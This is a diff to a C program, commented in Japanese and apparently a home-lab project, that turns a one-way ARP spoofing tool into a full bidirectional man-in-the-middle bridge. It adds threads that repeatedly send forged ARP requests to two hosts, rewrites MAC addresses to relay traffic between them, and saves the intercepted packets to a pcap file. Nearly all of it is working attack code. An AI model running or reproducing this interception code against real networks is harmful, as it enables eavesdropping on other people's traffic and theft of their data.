@@ -1,4 +1,5 @@
 #include	<stdio.h>
+#include    <stdlib.h>
 #include	<string.h>
 #include	<unistd.h>
 #include	<poll.h>
@@ -11,7 +12,10 @@
 #include    <sys/ioctl.h>
 #include    <linux/if.h>
 #include    <netinet/ip.h>
+#include    <pthread.h>
 #include	"netutil.h"
+#include    <unistd.h>
+#include    <sys/time.h>
 
 uint8_t bytes[6];
 
@@ -26,8 +30,12 @@ typedef struct	{
     char    *mac_B;
 }PARAM;
 //ここは手動で変える必要がある！
-//PARAM	Param={"enp4s0","lo",1, "192.168.1.4", "192.168.1.110", "A4:5E:60:B7:29:C7", "B8:27:EB:4A:A3:53"}; //AP DESK-RASPPI
-PARAM	Param={"enp0s3","lo",1, "192.168.0.28", "192.168.0.32", "D0:E1:40:98:DE:9A", "B8:27:EB:4A:A3:53"}; //JIKKA MBP-RASPPI
+//PARAM	Param={"enp4s0","lo",1, "192.168.1.4", "192.168.1.110", "A4:5E:60:B7:29:C7", "B8:27:EB:4A:A3:53"};
+//PARAM	Param={"enp4s0","lo",1, "192.168.1.7", "192.168.1.110", "08:00:27:CE:F8:80", "B8:27:EB:4A:A3:53"};
+//PARAM	Param={"enp0s3","lo",1, "192.168.1.99", "192.168.1.110", "68:05:CA:06:F6:7B", "B8:27:EB:4A:A3:53"};
+//PARAM	Param={"enp0s3","lo",0, "192.168.1.6", "192.168.1.99", "74:03:BD:7F:99:3E", "68:05:CA:06:F6:7B"};
+PARAM   Param={"enp0s3","lo",1, "192.168.0.28", "192.168.0.32", "D0:E1:40:98:DE:9A", "B8:27:EB:4A:A3:53"}; //JIKKA MBP-RASPPI
+
 
 typedef struct    {
     int    soc;
@@ -98,12 +106,83 @@ int AnalyzePacket(int deviceNo,u_char *data,int size)
     ptr+=sizeof(struct ether_header);
     lest-=sizeof(struct ether_header);
     DebugPrintf("[%d]",deviceNo);
+    
+    
     if(Param.DebugOut){
         PrintEtherHeader(eh,stderr);
     }
     
     return(0);
 }
+
+
+//---pcapDump用----
+#define TCPDUMP_MAGIC 0xa1b2c3d4
+#define PCAP_VERSION_MAJOR 2
+#define PCAP_VERSION_MINOR 4
+#define DLT_EN10MB 1
+
+//pcapファイルの先頭に書き込む
+struct pcap_file_header{
+    uint32_t magic;
+    uint16_t version_major;
+    uint16_t version_minor;
+    int32_t thiszone;   //タイムゾーン。GMT+1:00なら-3600になるらしいが、tcpdumpはここを0でダンプするのでそれに合わせる
+    uint32_t sigfigs;
+    uint32_t snaplen;   //最大パケット長。0xFF、つまり65535を指定するらしいが、このプログラムは2048までしか対応していない
+    uint32_t linktype;
+};
+
+char pcapDumpFileName[50] = "pcapDump.pcap";    //保存するpcapファイル名
+
+//pcapファイルを準備
+void pcap_init(){
+    struct pcap_file_header *pfhdr =  (struct pcap_file_header *) malloc(sizeof(struct pcap_file_header));
+    pfhdr->magic = TCPDUMP_MAGIC;
+    pfhdr->version_major = PCAP_VERSION_MAJOR;
+    pfhdr->version_minor = PCAP_VERSION_MINOR;
+    pfhdr->thiszone = 0;   //前述の通り、tcpdumpに合わせて0にしてしまう
+    pfhdr->snaplen = 65535;
+    pfhdr->sigfigs = 0;
+    pfhdr->linktype = DLT_EN10MB;
+
+    FILE *fpw = fopen(pcapDumpFileName, "ab");
+    fwrite(pfhdr, sizeof(struct pcap_file_header), 1, fpw);
+    fclose(fpw);
+
+    free(pfhdr);
+}
+
+//パケットの先頭に書き込む
+struct pcap_pkthdr{
+    //struct timeval ts; //この構造体を用いると、x86とx64の違いなのか、ひとつ64bitで保存されてしまいズレる
+    uint32_t ts_sec;    //このように32bitで保存しとく
+    uint32_t ts_usec;
+
+    uint32_t caplen;
+    uint32_t len;
+};
+
+//パケット追記する
+void pcap_write(u_char *data, int dsize){
+    struct pcap_pkthdr pkthdr;
+    struct timeval ts;
+    struct timezone tz;
+    gettimeofday(&ts, &tz);
+
+    pkthdr.ts_sec = (uint32_t)ts.tv_sec;
+    pkthdr.ts_usec = (uint32_t)ts.tv_usec;
+    pkthdr.caplen = dsize;
+    pkthdr.len = dsize;
+    
+    FILE *fpw = fopen(pcapDumpFileName, "ab");
+    fwrite(&pkthdr, sizeof(struct pcap_pkthdr), 1, fpw);
+    fwrite(data, dsize, 1, fpw);
+    fclose(fpw);
+}
+
+//---pcapDump用ここまで----
+
 
 //MITMパケットを検出し、IPアドレスとMACアドレスを書き換えとく
 int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_mac[6]){
@@ -156,8 +235,10 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         }
         
         //送信者かつ受信者のIPv4アドレスをチェック
-        if(*(in_addr_t *)arp->arp_spa == send_ip && *(in_addr_t *)arp->arp_tpa == rec_ip){
-            //端末BへのARPパケットだったら、無視する。（フォワーディングしてあげない）
+        int isAtoB = *(in_addr_t *)arp->arp_spa == send_ip && *(in_addr_t *)arp->arp_tpa == rec_ip;
+        int isBtoA = *(in_addr_t *)arp->arp_spa == rec_ip && *(in_addr_t *)arp->arp_tpa == send_ip;
+        if(isAtoB || isBtoA){
+            //AとBの間のARPパケットなので、無視する。（仲介してあげない）
             DebugPrintf("[%d]recv:MITM ARP PACKET:%dbytes\n",deviceNo,size);
             return (-1);
         }
@@ -180,13 +261,21 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         tempS.s_addr = iphdr->saddr;
         tempR.s_addr = iphdr->daddr;
         DebugPrintf("IP PACKET: %s to %s\n",inet_ntoa(tempS), inet_ntoa(tempR));
-        
+       
+        int isAtoB = (iphdr->saddr == send_ip && iphdr->daddr == rec_ip); 
+        int isBtoA = (iphdr->saddr == rec_ip && iphdr->daddr == send_ip); 
         //AからBへの通信のときは、IPアドレスとMACアドレスを入れ替えとく。
-        if(iphdr->saddr == send_ip && iphdr->daddr == rec_ip){
+        if(isAtoB || isBtoA){
+            pcap_write(data, size);
             DebugPrintf("[%d]recv:MITM IP PACKET:%dbytes\n",deviceNo,size);
+            printf("MITM IP PACKET\n");
             int ii=0;
-            //宛先は普通に端末BのMACアドレス
-            for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = rec_mac[ii];
+            //宛先は、AtoBならBに、BtoAならAのMACアドレスにする
+            if(isAtoB){
+                for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = rec_mac[ii];
+            }else{
+                for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = send_mac[ii];
+            }
             //送信元MACアドレスは自分
             for(ii=0; ii<6; ii++) eh->ether_shost[ii] = Device[deviceNo].hwaddr[ii];
             //IPアドレスは、送信元が端末A、宛先が端末Bになってるので変える必要はない
@@ -226,11 +315,12 @@ int MITMBridge(in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_
                         perror("read");
                     }
                     else{
-                        //TODO:この辺で、イーサヘッダとIPヘッダを書き換えて、MITMブリッジをする
                         if(AnalyzePacket(deviceNo,buf,size)!=-1){
-                            //MITMパケットの場合だけ送る
-                            if(proccessMITMPacket(deviceNo, buf, size, send_ip, send_mac, rec_ip, rec_mac) ){
-                                if((size=write(Device[deviceNo].soc,buf,size))<=0){
+                            u_char tmpBuf[2048];
+                            memcpy(tmpBuf, buf, size);
+                            //MITMパケットの場合だけ書き換えて送る
+                            if(proccessMITMPacket(deviceNo, tmpBuf, size, send_ip, send_mac, rec_ip, rec_mac) ){
+                                if((size=write(Device[deviceNo].soc, tmpBuf,size))<=0){
                                     perror("write");
                                 }
                             }
@@ -443,6 +533,33 @@ char *my_inet_ntoa_r(struct in_addr *addr,char *buf,socklen_t size)
 }
 //--------------
 
+//スレッド関係---
+struct argArp{
+    int soc;
+    in_addr_t ip_d;
+    in_addr_t ip_s;
+    u_char mac_d[6];
+    u_char mac_s[6];
+};
+
+void *arpspoof(void *p){
+    struct argArp  *arg = (struct argArp *)p;
+    while(1){
+        SendArpRequestB(arg->soc, arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
+        usleep(10*1000000);    
+    }
+
+    return (NULL);
+}
+
+void *StartMITMBridge(void *p){
+    struct argArp  *arg = (struct argArp *)p;
+    MITMBridge(arg->ip_d, arg->mac_d, arg->ip_s, arg->mac_s);
+    return (NULL);
+}
+
+//---
+
 int main(int argc,char *argv[],char *envp[])
 {
     char    buf[80];
@@ -486,6 +603,22 @@ int main(int argc,char *argv[],char *envp[])
     signal(SIGTTOU,SIG_IGN);
     
     DebugPrintf("bridge start\n");
+    
+    //スレッド関係の変数
+    pthread_t arpTid;
+    pthread_t arpTid_r;
+    pthread_t bridgeTid;
+    pthread_attr_t  attr;
+    
+    pthread_attr_init(&attr);
+    
+    //static  u_char    mac_B[6]={0x00,0x25,0x36,0xC3,0x74,0x16};  //router
+    static  u_char    mac_A[6];  //MBP
+    str2macaddr(Param.mac_A, mac_A);
+    //static  u_char    mac_A[6]={0x68,0x05,0xCA,0x06,0xF6,0x7B};   //端末AのMACアドレス(desk-h)
+    static  u_char    mac_B[6]; //端末BのMACアドレス(rasp-h)
+    str2macaddr(Param.mac_B, mac_B);
+
     //---ARPスプーフィング
     static  u_char    bcast[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};    //ブロードキャストMACアドレス
     char    *in_addr_text_sender = Param.ip_A;                     //ARPスプーフィング先A
@@ -495,31 +628,70 @@ int main(int argc,char *argv[],char *envp[])
     
     inet_aton(in_addr_text_sender, &sendIp);
     inet_aton(in_addr_text_receiver, &recIp);
+
+    //スレッド用引数の準備
+    struct argArp arg_arpspoof;
+    arg_arpspoof.soc = Device[0].soc;
+    arg_arpspoof.ip_d = sendIp.s_addr;
+    arg_arpspoof.ip_s = recIp.s_addr;
+    //MACaddrのコピー
+    memcpy(arg_arpspoof.mac_d, mac_A, 6);
+    memcpy(arg_arpspoof.mac_s, Device[0].hwaddr, 6);
+   
+    //A→BのARPスプーフィング開始。ARPリクエストを送りつける
+    int status;
+    if((status=pthread_create(&arpTid,&attr, arpspoof, &arg_arpspoof))!=0){
+        DebugPrintf("pthread_create:%s\n",strerror(status));
+    }
+
+    //IPAddrを入れ替えただけ
     
-    //DebugPrintf("NextRouter=%s\n",my_inet_ntoa_r(&NextRouter,buf,sizeof(buf)));
-    
-    //SendArpRequestB(Device[0].soc, recIp.s_addr, bcast, Device[0].addr.s_addr, Device[0].hwaddr);
-    //sendIp→recIpの通信をこちらに回すARPスプーフィング。相手のIPアドレスに、こちらは端末BのIPアドレス、かつ自分のMACアドレスを入れてリクエストを送る
-    int     i=0;
-    for(i=0; i<100; i++){
-        SendArpRequestB(Device[0].soc, sendIp.s_addr, bcast, recIp.s_addr, Device[0].hwaddr);
+    //スレッド用引数の準備
+    struct argArp arg_arpspoof_r;
+    arg_arpspoof_r.soc = Device[0].soc;
+    arg_arpspoof_r.ip_d = recIp.s_addr;
+    arg_arpspoof_r.ip_s = sendIp.s_addr;
+    //MACaddrのコピー
+    memcpy(arg_arpspoof_r.mac_d, mac_B, 6);
+    memcpy(arg_arpspoof_r.mac_s, Device[0].hwaddr, 6);
+  
+    //B→AのARPスプーフィング開始。ARPリクエストを送りつける
+    if((status=pthread_create(&arpTid_r,&attr, arpspoof, &arg_arpspoof_r))!=0){
+        DebugPrintf("pthread_create:%s\n",strerror(status));
     }
     
-    //TODO:あとでPARAMSに移動
-    //static  u_char    mac_B[6]={0x00,0x25,0x36,0xC3,0x74,0x16};  //router
-    static  u_char    mac_A[6];  //MBP
-    str2macaddr(Param.mac_A, mac_A);
     
-    //static  u_char    mac_A[6]={0x68,0x05,0xCA,0x06,0xF6,0x7B};   //端末AのMACアドレス(desk-h)
-    static  u_char    mac_B[6]; //端末BのMACアドレス(rasp-h)
-    str2macaddr(Param.mac_B, mac_B);
     
+    
+
     //---ARPスプーフィングここまで
     //---ブリッジ
-    MITMBridge(sendIp.s_addr, mac_A, recIp.s_addr, mac_B);
+    
+    //スレッド用引数の準備
+    struct argArp arg_bridge;
+    arg_bridge.soc  = Device[0].soc;
+    arg_bridge.ip_d = sendIp.s_addr;
+    arg_bridge.ip_s = recIp.s_addr;
+    //MACaddrのコピー
+    memcpy(arg_bridge.mac_d, mac_A, 6);
+    memcpy(arg_bridge.mac_s, mac_B, 6);
+   
+    //pcapダンプ用意
+    pcap_init();
+
+    //双方向ブリッジ開始
+    if((status=pthread_create(&bridgeTid,&attr, StartMITMBridge, &arg_bridge))!=0){
+        DebugPrintf("pthread_create:%s\n",strerror(status));
+    }
+    
     //Bridge();
     //---ブリッジここまで
     DebugPrintf("bridge end\n");
+
+    //スレッド終了を待つ
+    pthread_join(arpTid     , NULL);
+    pthread_join(arpTid_r   , NULL);
+    pthread_join(bridgeTid  , NULL);
     
     close(Device[0].soc);
     close(Device[1].soc);
